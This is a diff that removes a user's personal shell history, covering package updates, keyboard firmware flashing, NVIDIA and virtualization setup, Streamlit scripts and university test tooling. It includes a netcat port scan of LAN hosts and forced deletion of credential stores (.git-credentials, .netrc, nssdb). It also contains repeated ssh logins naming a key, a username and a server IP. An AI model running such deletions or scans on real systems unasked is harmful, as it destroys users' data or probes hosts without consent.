@@ -1,1113 +1,3 @@
-v Downloads/beekeeb_piantor_pro_rad1an.json
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-v Downloads/beekeeb_piantor_pro_rad1an.json
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo dnf update -y
-sudo dnf remove netcat
-ping duck.com
-flatpak install protonvpn
-v dotfiles/scripts/install_packages.sh
-flatpak install qbittorent
-flatpak install qbittorrent
-v dotfiles/scripts/install_packages.sh
-d plasmashell --replace
-d kdeconnectd --replace
-sudo systemctl status kdeconnectd
-v .config/kdeconnect/config
-flatpak list
-flatpak list | grep zen
-j cv
-lvim main.tex
-rubber-info
-v dotfiles/scripts/install_packages.sh
-sudo dnf install 'tex(wallpaper.sty)' 'tex(fontawesome5.sty)' 'tex(hyphenat.sty)' rubber
-sudo dnf install 'tex(wallpaper.sty)' 'tex(fontawesome5.sty)' 'tex(hyphenat.sty)' rubber
-v dotfiles/scripts/install_packages.sh
-lvim main.tex
-ping duck.com
-ping duck.com
-ping duck.com
-ping duck.com
-ping duck.com
-ping duck.com
-ping duck.com
-source tmpvenv/bin/activate
-ls
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-v Downloads/beekeeb_piantor_pro_rad1an.json
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-killall dragonplayer
-killall dragon-player
-ps | grep dragon
-ps
-top | grep dragon
-killall dragon
-top | grep dragon
-bash
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo dnf update -y
-cd Downloads
-ls
-v ratings.csv
-o .
-j proj1
-ls
-v team8/main.py
-cd team8
-python main.py
-python main.py
-source tmpvenv/bin/activate
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-v temp/py.py
-j proj1
-ls
-cd team5
-v main.py
-v main.py
-v main.py
-convim
-j proj1
-cd team5
-v main.py
-cd ../team6
-v main.py
-v main.py
-sudo journalctl -b-1
-chromium-browser
-\rm -rf ~/.pki/nssdb
- mkdir -p ~/.pki/nssdb
- certutil -N -d sql:$HOME/.pki/nssdb
- certutil -N -d sql:$HOME/.pki/nssdb
-la
-v .netrc
-\rm -r .netrc .nvidia-settings-rc .python_history
-v .git-credentials
-\rm .git-credentials
-la
-\rm -r .cert
-\rm -r .pki .nv
-la
-\rm -r .bash_history
-la
-v .gtkrc-2.0
-update
-sudo dnf update -y
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo dnf install akmod-nvidia
-sudo dnf install xorg-x11-drv-nvidia-cuda
-modinfo -F version nvidia
-sudo dnf install xorg-x11-drv-nvidia-power
-sudo systemctl enable nvidia-{suspend,resume,hibernate}
-sudo systemctl enable nvidia-{suspend,resume,hibernate}
-sudo dnf install vulkan
-v dotfiles/scripts/install_packages.sh
-sudo dnf install -y xorg-x11-drv-nvidia-cuda xorg-x11-drv-nvidia-cuda-libs nvidia-vaapi-driver libva-utils vdpauinfo 
-vdpauinfo
-vainfo
-vainfo
-vdpauinfo
-source tmpvenv/bin/activate
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-v Downloads/beekeeb_piantor_pro_rad1an.json
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-j clas
-ls
-fish
-v .local/share/fish/fish_history
-run-help grade
-run-help grade
-grade ga -stf my_people_classroom.md -eisd
-ls
-ls Ѓ�обота\ з\ даними
-j venvs
-ls
-cd rgrader_venv
-source bin/activate
-ls
-pip install --upgrade rgrader
-cd
-v dotfiles/scripts/install_packages.sh
-pip install --upgrade rgrader pylint numpy
-grade ga -stf my_people_classroom.md -eisd
-ls
-v my_people_classroom
-v my_people_classroom.md
-grade ga -stf my_people_classroom.md -eisd
-v my_people_classroom.md
-ls
-v karavaiev_data.py
-o .
-source /drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit run yazlovetska_streamlit.py
-streamlit hello
-da
-source ~/Drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit hello
-da
-source ~/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit hello
-da
-j leave
-cd try_streamlit
-source venv/bin/activate
-streamlit hello
-rg leave_no_one
-source /drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit hello
-da
-streamlit hello
-source /drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit hello
-ls
-v test.py
-v dotfiles/local/share/zsh/zsh_history
-source /drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit run yazlovetska_streamlit.py
-da
-ji leave
-ji Proj
-j leave
-j
-j leave
-source venv/bin/activate
-ls
-j streamlit
-source venv/bin/activate
-streamlit run yazlovetska_streamlit.py
-pip install streamlit
-\rm -r venv
-python -m venv venv
-source venv/bin/activate
-pip install streamlit
-streamlit run test.py
-source /drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit run yazlovetska_streamlit.py
-pip install plotly
-v yazlovetska_streamlit.py
-pip install pandas
-v karavaiev_data.py
-streamlit run yazlovetska_streamlit.py
-v yazlovetska_streamlit.py
-streamlit run karavaiev_data.py
-streamlit run pidsadniy.py
-streamlit run work_with_data_sviahla.py
-v work_with_data_sviahla.py
-streamlit run work_with_data_sviahla.py
-export TERM=alacritty
-v temp/py.py
-ls
-j proj1
-ls
-v team8/main.py
-tic -xe alacritty,alacritty-direct extra/alacritty.info
-source /drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-cd Downloads
-streamlit run melnyk.py
-streamlit run rushchak.py
-streamlit run khvostenko.py
-streamlit run luzhnyi.py
-update
-sudo dnf update -y
-flatpak --user update -y && flatpak update -y && tldr --update
-j pet
-v lua/pet/init.lua
-v temp/py.py
-git add .
-git commit -m "Add doc"
-git push
-v lua/pet/init.lua
-v temp/py.py
-v temp/py.py
-git add .
-git commit -m "refactor to classes etc"
-git push
-cd Downloads
-ls
-source /drive/Projects/Life/leave_no_one_behind/try_streamlit/venv/bin/activate
-streamlit run mykhailiuk.py
-ls
-\rm mykhailiuk.py
-gu
-j priv
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j cv
-lvim main.tex
-j pet
-ls
-v lua/pet/init.lua
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/sh.sh
-v temp/sh.sh
-git add .
-git commit -m "Add ability to make own moving function"
-v README.md
-v temp/sh.sh
-v temp/sh.sh
-v temp/sh.sh
-v temp/sh.sh
-v temp/sh.sh
-v temp/sh.sh
-v temp/sh.sh
-v temp/sh.sh
-v temp/sh.sh
-git status
-git diff
-git add .
-git commit -m "Add better documentation on custom move function"
-git push
-alacritty -e fish -c "nvim -u ~/.config/nvim/init_latex.lua '/home/rad1an/Drive/conspectus/Conspectus/$(wl-paste)'"
-alacritty -e fish -c "nvim -u ~/.config/nvim/init_latex.lua '/home/rad1an/Drive/conspectus/Conspectus/$(wl-paste)'"
-alacritty -e nvim -u ~/.config/nvim/init_latex.lua '/home/rad1an/Drive/conspectus/Conspectus/$(wl-paste)'
-alacritty -e zsh -c "nvim -u ~/.config/nvim/init_latex.lua '/home/rad1an/Drive/conspectus/Conspectus/$(wl-paste)'"
-alacritty -e zsh -c "nvim -u ~/.config/nvim/init_latex.lua '/home/rad1an/Drive/conspectus/Conspectus/$(wl-paste)'"
-alias update-grub
-sha256sum EndeavourOS_Endeavour_neo-2024.09.22.iso
-sha512sum -c EndeavourOS_Endeavour_neo-2024.09.22.iso.sha512sum
-ls dotfiles/scripts
-j dotfiles/scripts
-o .
-sh Ventoy2Disk.sh -u /dev/sdb
-sudo sh Ventoy2Disk.sh -u /dev/sdb
-pipx
-pipx
-pip install --user --upgrade pipx argcomplete
-pacman -S --noconfirm python-pipx
-sudo pacman -S --noconfirm python-pipx
-v dotfiles/config/tmux/tmux.conf
-v dotfiles/config/tmux/tmux.conf
-v dotfiles/config/tmux/tmux.conf
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=launch-script.sh --file-forwarding app.zen_browser.zen -P UCU --name zen-ucu
-j linux
-ls
-v old_cursor_in_some_apps.txt
-sudoedit /usr/share/icons/default/index.theme
-sudoedit /usr/share/icons/default/index.theme
-flatpak --user override --filesystem=/home/$USER/.icons/:ro
- flatpak --user override --filesystem=/usr/share/icons/:ro
-plasmashell -V
-plasmashell -v
-v dotfiles/scripts/install_packages.sh
-v dotfiles/scripts/install_arch.sh
-sudo pacman -S flatpak-kcm
-flatpak --user override --filesystem=/home/$USER/.local/share/icons/:ro
-ls .local/share/ic
-ls .local/share/icons
-v .local/share/icons/default/index.theme 
-ls .local/share/icons
-v .local/share/icons/default/index.theme 
-v dotfiles/scripts/install_arch.sh
-flatpak --user override --filesystem=/home/$USER/.icons/:ro
-v dotfiles/scripts/install_arch.sh
-cd Downloads
-o .
-python alley_map6.py
-v alley_map6.py
-chromium
-v Ѓ�леу�/alley_map.
-v Ѓ�леу�/alley_map.py
-v Ѓ�леу�/alley_map.
-v Ѓ�леу�/alley_map.py
-v alley_map6.py
-v Ѓ�леу�/alley_map.py
-cd Ѓ�леу�
-v alley_map.
-v alley_map.py
-cd Downloads
-ls
-cd alley_map
-ls
-v alley_map.txt
-ls
-cd ..
-ls
-\rm alley_map Ѓ�леу� alley_map6.py
-\rm alley_map Ѓ�леу� -r
-la
-ls
-v test_alley_map.txt
-\rm test_alley_map.txt
-ls
-ls
-o .
-cd ..
-ls
-o .
-flatpak list | grep office
-v dotfiles/scripts/install_arch.sh
-v cinema5/kinokritik.py
-v cinema5/kinokritik.py
-pacman -h
-sudo pacman -q webapp
-yay webapp
-flatpak search webapp
-v dotfiles/scripts/install_arch.sh
-flatpak list
-flatpak list | grep user
-v dotfiles/config/tmux/tmux.conf
-flatpak uninstall --user app.zen_browser.zen && flatpak install app.zen_browser.zen
-flatpak install --system app.zen_browser.zen
-sudo ranger /var/
-sudo ranger /var/
-sudo o .
-o .
-ls .zen
-flatpak uninstall --system app.zen_browser.zen
-flatpak install --user app.zen_browser.zen
-flatpak uninstall --user app.zen_browser.zen && flatpak install --system app.zen_browser.zen
-v kinokritik7/kinokritik.py
-flatpak uninstall --user com.discordapp.Discord im.riot.Riot org.signal.Signal org.telegram.desktop net.codelogistics.webapps org.onlyoffice.desktopeditors com.github.tchx84.Flatseal com.bitwarden.desktop org.kde.kalgebra com.obsproject.Studio org.videolan.VLC io.github.martchus.syncthingtray org.prismlauncher.PrismLauncher com.modrinth.ModrinthApp com.heroicgameslauncher.hgl net.mullvad.MullvadBrowser com.github.micahflee.torbrowser-launcher com.protonvpn.www org.qbittorrent.qBittorrent com.github.tenderowl.frog org.inkscape.Inkscape
-flatpak install --system com.discordapp.Discord im.riot.Riot org.signal.Signal org.telegram.desktop net.codelogistics.webapps org.onlyoffice.desktopeditors com.github.tchx84.Flatseal com.bitwarden.desktop org.kde.kalgebra com.obsproject.Studio org.videolan.VLC io.github.martchus.syncthingtray org.prismlauncher.PrismLauncher com.modrinth.ModrinthApp com.heroicgameslauncher.hgl net.mullvad.MullvadBrowser com.github.micahflee.torbrowser-launcher com.protonvpn.www org.qbittorrent.qBittorrent com.github.tenderowl.frog org.inkscape.Inkscape
-flatpak search webapp
-flatpak search chromium
-pacman -Rns chromium
-sudo pacman -Rns chromium
-pacman -S ungoogled-chromium
-sudo pacman -S ungoogled-chromium
-sudo pacman -q ungoogled-chromium
-sudo pacman -Q ungoogled-chromium
-sudo pacman -Q ungoogled
-sudo pacman -Q chromium
-flatpak install --system io.github.elevenhsoft.WebApps
-sudo pacman -S chromium
-sudo pacman -Rns chromium
-flatpak install --system io.github.ungoogled_software.ungoogled_chromium
-flatpak list
-flatpak run io.github.elevenhsoft.WebApps
-flatpak uninstall net.codelogistics.webapps
-flatpak install --system net.codelogistics.webapps
-flatpak uninstall io.github.elevenhsoft.WebApps
-flatpak install --system io.github.elevenhsoft.WebApps
-cd /home/rad1an/dotfiles/local/share/applications
-ls
-ls ~
-trash ~
-ls
-v webapp-telegram7324.desktop
-v webapp-Telegram6711.desktop
-\rm -r webapp-telegram7324.desktop
-v webapp-Discord2553.desktop
-v webapp-Discord8742.desktop
-\rm webapp-Discord8742.desktop
-ls
-v net.local.flatpak.desktop
-flatpak uninstall net.codelogistics.webapps
-v dotfiles/scripts/install_arch.sh
-v dotfiles/scripts/install_arch.sh
-v .config/kdeconnect/config
-ping 10.8.0.2
-inetcat
-sudo pacman -S netcat
-netcat -z -v 10.8.0.3 1714-1764
-netcat -z -v 10.8.0.3 1714-1764
-sudo pacman -Rns netcat
-sudo pacman -Rns gnu-netcat
-killall kdeconnectd
-kdeconnect-cli --refresh
-kdeconnect-cli -l
-v .config/.gitignore
-cd .config
-git status
-git add kdeconnect
-v .gitignore
-git add kdeconnect
-v .gitignore
-ls kdeconnect
-v .gitignore
-v .gitignore
-v .gitignore
-git status
-git add kdeconnect/
-git status
-git add .
-cd ..
-git add .
-cd dotfiles
-git add .
-\rm -r scripts/ventoy
-git add .
-git status
-git rm --cached local/share/icons
-git rm --cached local/share/icons -r
-v .local/share/.gitignore
-git add local/share/icons/
-git status
-cd ..
-cd -
-git commit -m "Migrate to endeavour"
-git push
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo dnf update -y
-zshrc
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo dnf update -y
-zshrc
-zshrc
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo dnf update -y
-zshrc
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu
-sudo pacman -Syu
-v dotfiles/scripts/install_arch.sh
-zshrc
-ff
-fastfetch
-ls .local/share
-zshrc
-v dotfiles/scripts/install_arch.sh
-sudo pacman -S xdg-desktop-portal-gtk
-v
-v dotfiles/scripts/install_arch.sh
-sudo pacman -S xsettingsd
-podman
-python
-sudoedit /etc/python/pythonrc
-v dotfiles/scripts/install_arch.sh
-sudo sh -c "cp /dev/null /etc/python/pythonrc"\
-echo "import os\
-import atexit\
-import readline\
-from pathlib import Path\
-\
-if readline.get_current_history_length() == 0:\
-\
-    state_home = os.environ.get(\"XDG_STATE_HOME\")\
-    if state_home is None:\
-        state_home = Path.home() / \".local\" / \"state\"\
-    else:\
-        state_home = Path(state_home)\
-\
-    history_path = state_home / \"python_history\"\
-    if history_path.is_dir():\
-        raise OSError(f\"'{history_path}' cannot be a directory\")\
-\
-    history = str(history_path)\
-\
-    try:\
-        readline.read_history_file(history)\
-    except OSError: # Non existent\
-        pass\
-\
-    def write_history():\
-        try:\
-            readline.write_history_file(history)\
-        except OSError:\
-            pass\
-\
-    atexit.register(write_history)\
-" | sudo tee -a /etc/python/pythonrc > /dev/null
-sudoedit /etc/python/pythonrc
-ls
-la
-\rm .python_history .bash_history
-python
-sudoedit /etc/python/pythonrc
-v .local/state/python_history
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu --noconfirm
-flatpak search arduino
-flatpak install --system cc.arduino.IDE2
-v dotfiles/scripts/install_arch.sh
-lsusb
-groups
-compgen -g
-sudo usermod -a -G tty rad1an
-ls -l /dev/ttyACM*
-sudo ls -l /dev/ttyACM*
-sudo usermod -a -G dialout rad1an
-flatpak run --device=all cc.arduino.IDE2
-sudo chown username /dev/ttyUSB0
-sudo chown rad1an /dev/ttyUSB0
-sudo chown rad1an /dev/ttyUSB0
-sudo usermod -a -G dialout rad1an
-sudo adduser rad1an dialout
-sudo usermod -a -G uucp rad1an
-v dotfiles/scripts/install_arch.sh
-flatpak run --device=all cc.arduino.IDE2
-flatpak run --user --device=all cc.arduino.IDE2
-sudo usermod -a -G tty rad1an
-cd Arduino/Projects/01.1_Car_Move_and_Turn
-ls
-v 01.1_Car_Move_and_Turn.ino
-v 01.1_Car_Move_and_Turn.ino
-cpuid
-sudo pacman -S cpuid
-sudo pacman -S cpuinfo
-cpuid
-yay cpuid
-cpuid
-yay -R cpuid
-sudo pacman -R cpuid
-sudo pacman -R kcpuid
-yay -R cpuid
-yay cpuid
-cpuid
-cpuid -1
-yay -h
-yay -R cpuid
-cpuid
-yay cpuid
-cpuid -1
-yay -R cpuid
-j priv
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu --noconfirm
-v temp/py.py
-v Downloads/beekeeb_piantor_pro_rad1an.json
-v Downloads/beekeeb_piantor_pro_rad1an.json
-source tmpvenv/bin/activate
-qmk flash Downloads/beekeeb_piantor_pro_rad1an.json
-ls
-\rm qmk_firmware tmpvenv -r
-\rm qmk_firmware tmpvenv -rf
-ls
-la
-v Downloads/beekeeb_piantor_pro_rad1an.json
-ls
-cd Downloads
-ls
-v dotfiles/scripts/install_arch.sh
-sudo pacman --needed --noconfirm -S git python-pip libffi
-v dotfiles/scripts/install_arch.sh
-python -m venv venv
-source venv/bin/activate
-ls
-pip install --user qmk
-pip install qmk
-cd ..
-da
-sudo pacman -S qmk
-v dotfiles/scripts/install_arch.sh
-qmk flash ~/Downloads/beekeeb_piantor_pro_rad1an.json
-qmk setup
-qmk setup -h
-ls
-\rm qmk -r
-qmk setup -H /large
-qmk setup -H /large/qmk_firmware
-sudo cp /large/qmk_firmware/util/udev/50-qmk.rules /etc/udev/rules.d/
-qmk setup -H /large/qmk_firmware
-qmk setup
-qmk config user.keyboard=beekeeb/piantor_pro
-qmk flash ~/Downloads/beekeeb_piantor_pro_rad1an.json
-podman ps -a
-docker
-yay chromium
-novideo chromium
- chromium
- chromium
-novideo chromium
-novideo flatpak run app.zen_browser.zen
-novideo chromium
-j ucu
-ls
-cd acs
-ls
-mkdir assistance
-cd assistance
-git clone git@github.com:ucu-cs/UCU_autotests.git
-ls
-cd UCU_autotests
-ls
-cd acs
-ls
-cd integral
-ls
-v integral.sh
-m4
-m4 --help
-ls
-v compare.sh
-cd ..
-mv integral integral_old
-mkdir integral
-cd integral
-ls
-v test_integral.py
-v Downloads/perf_io_tests.py
-j pri
-ls
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-/ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-cd ../integral_old
-rg epsilon
-rg EPSILON
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j integral
-cd ..
-ls
-cd ../acs/lab3-integral-husiev-opyr-zaletskyi
-ls
-ls
-ls bin
-./compile.sh -d
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ls
-cp ~/Projects/ucu/acs/lab3-integral-husiev-opyr-zaletskyi .
-cp ~/Projects/ucu/acs/lab3-integral-husiev-opyr-zaletskyi/bin/integrate_serial ./correct
-./correct 1 conf1.cfg
-./correct 1 conf1.cfg
-./correct 1 conf1.cfg
-./correct 1 conf1.cfg
-cd ../integral_old
-rg EPSILON
-rg epsilon
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-mv correct integrate_parallel
-python test_integral.py
-mv integrate_parallel correct
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v test_integral.py
-python test_integral.py build
-ls
-ls build
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v test_integral.py
-python test_integral.py build
-v test_integral.py
-v test_integral.py
-ls
-ls bin
-ls build
-python test_integral.py build
-v test_integral.py
-v test_integral.py
-python test_integral.py build
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v test_integral.py
-ls build
-ls
-v test_integral.py
-v test_integral.py
-v test_integral.py
-python test_integral.py build
-ls
-ls biuld
-ls build
-v test_integral.py
-v test_integral.py
-python test_integral.py build
-v test_integral.py
-python test_integral.py build
-v test_integral.py
-ls
-ls build
-python test_integral.py build
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v test_integral.py
-v test_integral.py
-python test_integral.py build
-v test_integral.py
-python test_integral.py build
-cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/conf* .
-ls
-v test_integral.py
-python test_integral.py build
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ls
-v test_integral.py
-python test_integral.py build
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ls
-v test_integral.py
-python test_integral.py build
-v test_integral.py
-python test_integral.py build
-v test_integral.py
-python test_integral.py build
-ls
-v test_integral.py
-python test_integral.py build -c
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v test_integral.py
-v test_integral.py
-python test_integral.py build -c
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v test_integral.py
-python test_integral.py build -c
-ls
-v test_integral.py
-python test_integral.py build -c
-ls
-ls ..
-ls
-v test_integral.py
-python test_integral.py build -c
-v test_integral.py
-python test_integral.py build -c
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ls
-\rm -r conf*
-v test_integral.py
-python test_integral.py build -c
-ls
-ls /tmp
-v test_integral.py
-ls
-\rm correct
-cd ..
-git add .
-git status
-git commit -m "Add a basic integral tester"
-git push
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j privex
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v test_integral.py
-cd integral
-v test_integral.py
-python test_integral.py build -c
-v test_integral.py
-v test_integral.py
-v test_integral.py
-python test_integral.py build -c
-v test_integral.py
-v test_integral.py
-git add . -i
-git add . -a
-git add -i
-git add -p
-git commit -m "Add better error messages to integral tester"
-git push
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu --noconfirm
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-kdeconnect-cli -l
-kdeconnect-cli --refresh
-update
-sudo pacman -Syu --noconfirm
-flatpak --user update -y && flatpak update -y && tldr --update
-lscpu | grep -i Virtualization
-zgrep CONFIG_KVM /proc/config.gz
-v dotfiles/scripts/install_arch.sh
-sudo pacman -S qemu-full qemu-img libvirt virt-install virt-manager virt-viewer \\
-edk2-ovmf dnsmasq swtpm guestfs-tools libosinfo tuned\
-
-v dotfiles/scripts/install_arch.sh
-v dotfiles/scripts/install_arch.sh
-for drv in qemu interface network nodedev nwfilter secret storage; do\
-    sudo systemctl enable virt${drv}d.service;\
-    sudo systemctl enable virt${drv}d{,-ro,-admin}.socket;\
-done
-sudo virt-host-validate qemu
-v dotfiles/scripts/install_arch.sh
-sudoedit /etc/dracut.conf
-sudoedit /etc/dracut.conf.d/calamares-luks.conf
-sudoedit /etc/dracut.conf.d/eos-defaults.conf
-sudoedit /etc/dracut.conf.d/resume.conf
-v dotfiles/scripts/install_arch.sh
-sudoedit /etc/dracut.conf.d/resume.conf
-sudoedit /etc/dracut.conf.d/eos-defaults.conf
-v dotfiles/scripts/install_arch.sh
-sudo sh -c "cp /dev/null /etc/dracut.conf.d/virt.conf"\
-echo 'kernel_cmdline+=" intel_iommu=on "' | sudo tee -a /etc/dracut.conf.d/virt.conf > /dev/null
-sudoedit /etc/dracut.conf.d/virt.conf
-dracut --hostonly --no-hostonly-cmdline --add-confdir no-network /boot/initramfs-linux.img
-sudo dracut --hostonly --no-hostonly-cmdline --add-confdir no-network /boot/initramfs-linux.img
-sudo virt-host-validate qemu
-sudoedit /etc/dracut.conf.d/virt.conf
-sudo rm /etc/dracut.conf.d/virt.conf
-v dotfiles/scripts/install_arch.sh
-sudoedit /etc/kernel/cmdline
-v dotfiles/scripts/install_arch.sh
-sudo reinstall-kernels
-sudo virt-host-validate qemu
-v dotfiles/scripts/install_arch.sh
-sudo systemctl enable --now tuned.service
-tuned-adm active
-tuned-adm list
-sudo tuned-adm profile virtual-host
-tuned-adm active
-sudo tuned-adm verify
-sudo virsh uri
-kdeconnect-cli --refresh
-j co co
-rg '[[УЃ�У'
-rg '\[\[УЃ�У'
-v УЃ�У/Ѓ�ву�тоглу�дне у�дро/Ѓ�арадигма/Ѓ�ру�у�.md
-v 'УЃ�У/Ѓ�ву�тоглу�дне у�дро/Ѓ�арадигма/Ѓ�ру�у�.md'
-v 'УЃ�У/Ѓ�ву�тоглу�дне у�дро/Ѓ�арадигма/Ѓ�ру�у�.md'
-v 'УЃ�У/Ѓ�ву�тоглу�дне у�дро/Health/Health project.md'
-v 'УЃ�У/Ѓ�ву�тоглу�дне у�дро/Health/Health Project Description.md'
-rg депресу�у�
-v 'Ѓ�ФЃ�Ѓ�/Украу�нсу�ка лу�терату�ра/Ѓ�у�терату�рне у�у�стдесу�тниу�тво/Ѓ�ригу�р Ѓ�у�ту�нник/Ѓ�ригу�р Ѓ�у�ту�нник.md'
-rg Ѓ�епресу�
-rg депресу�
-rg Ѓ�ФЃ�Ѓ�
-rg у�у�зико
-rg у�у�змат
-rg aliases
-v dotfiles/scripts/install_arch.sh
-rg Ѓ�Ѓ�Х
-rg ссу�
-rg ерноп
-lvim 'Ѓ�сту�п до у�ну�верситету�/Ѓ�у�дготовка до Ѓ�Ѓ�Ѓ�/Ѓ�стору�у�/Украу�на пу�д у�ас Ѓ�Ѓ� сву�товоу� ву�йни.md'
-lvim 'Ѓ�сту�п до у�ну�верситету�/Ѓ�у�дготовка до Ѓ�Ѓ�Ѓ�/Ѓ�стору�у�/Украу�нсу�ка револу�у�у�у�.md'
-lvim 'Ѓ�ФЃ�Ѓ�/Ѓ�стору�у�/Ѓ�Ѓ� Ѓ�ву�това/Ѓ�оу�аток Ѓ�Ѓ� Ѓ�ву�товоу� длу� Украу�ни.md'
-lvim 'Ѓ�ФЃ�Ѓ�/Ѓ�стору�у�/Ѓ�Ѓ� Ѓ�ву�това/Ѓ�ку�пау�у�йний режим в Украу�ну� пу�д у�ас Ѓ�Ѓ� Ѓ�ву�товоу�.md'
-rg Ѓ�ену�ку�н
-lvim 'Ѓ�сту�п до у�ну�верситету�/Ѓ�у�дготовка до Ѓ�Ѓ�Ѓ�/Ѓ�стору�у�/Украу�нсу�ка револу�у�у�у�.md'
-j co ht
-ls
-v .github/workflows/static.yml
-git add .
-git commit -m "Bump workflow actions versions"
-git push
-j co ht
-j co ht
-ls
-ls lib
-rg rss
-fd rss
-ls lib
-rg rad1an
-rg rad1an | grep rad1an
-rg rad1an .
-grep rad1an -R
-rg rad1an
-rg rad1an > tmp
-v tmp
-fg
-vb tmp
-\rm tmp
-j co co
-v .gitignore
-la
-ls lib
-v LICENSE.
-cd ..
-cd -
-la
-\rm -r excalidraw lib license python всту�п-до-у�ну�верситету� житту� лу�мл математика/ проу�кти у�ку� LICENSE. preamble.sty readme.html
-ls
-la
-la
-ls lib
-fd rss
-fd feed
-ls
-git status
-j co co
-rg github
-rg '[^/]github'
-j co co
-lvim 'УЃ�У/DB/db hw4.md'
-rg 'Github'
-lvim 'Ѓ�сту�п до у�ну�верситету�/УЃ�У/Ѓ�лу� у�коли, однокласнику�в стипенду�у� УЃ�У.md'
-lvim 'Ѓ�сту�п до у�ну�верситету�/УЃ�У/Ѓ�лу� у�коли, однокласнику�в стипенду�у� УЃ�У.md'
-lvim 'Ѓ�итту�/Ѓ�орисне/Linux.md'
-j co ht
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-v temp/cpp.cpp
-clang++ temp/cpp.cpp
-ls
-./a.out
-\rm -r a.out
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu --noconfirm
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu --noconfirm
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu --noconfirm
-jvim gradients.ipynb
-cd dotfiles/local/share/venvs
-ls
-\rm -r jupyter_venv
-v dotfiles/scripts/install_arch.sh
-python -m venv ~/.local/share/venvs/jupyter_venv
-cargo install geckodriver\
-source ~/.local/share/venvs/jupyter_venv/bin/activate\
-pip install --upgrade notebook nbclassic jupyter-console\
-deactivate
-source ~/.local/share/venvs/rgrader_venv/bin/activate\
-pip install --upgrade rgrader pylint numpy\
-deactivate
-pip install --upgrade types-PyYAML\
-pip install --upgrade mypy # for some reason does not work for nvim-lint inside venv\
-
-sudo pacman -S python-mypy
